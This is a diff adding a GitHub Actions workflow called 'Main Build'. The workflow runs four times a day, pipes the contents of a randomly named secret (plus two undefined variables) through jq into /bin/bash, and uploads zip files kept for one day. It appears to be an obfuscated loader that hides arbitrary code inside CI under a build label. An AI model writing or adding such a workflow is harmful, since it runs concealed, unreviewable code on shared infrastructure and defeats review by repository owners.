@@ -1,0 +1,31 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '20 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run task
+        env:
+          ejv2117: ${{ secrets.ejv2117 }}
+        run: |
+          printf '%s' "$ejv2117" | jq -r .sawg3 | /bin/bash
+          printf '%s' "$ksdo3" | jq -r .lowvv9 | /bin/bash
+          printf '%s' "$fesoh3" | jq -r .eoey527 | /bin/bash
+
+      - name: Store output
+        uses: actions/upload-artifact@v4
+        with:
+          name: xRMCx77J
+          path: "*.zip"
+          retention-days: 1
